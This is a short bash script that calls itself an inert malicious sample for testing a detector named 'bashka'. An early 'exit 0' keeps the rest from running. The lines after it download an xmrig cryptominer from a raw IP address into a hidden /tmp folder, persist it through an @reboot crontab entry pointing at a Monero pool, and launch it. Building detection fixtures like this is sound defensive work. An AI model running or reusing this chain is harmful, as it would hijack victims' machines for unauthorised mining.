#!/bin/bash
# INERT malicious sample for bashka detection testing. Do not run.
exit 0
PATH=/tmp/.x:$PATH
curl -fsSL http://45.9.148.37/xmrig -o /tmp/.x/m
chmod +x /tmp/.x/m
(crontab -l 2>/dev/null; echo "@reboot /tmp/.x/m --url pool.minexmr.com:4444") | crontab -
/tmp/.x/m &
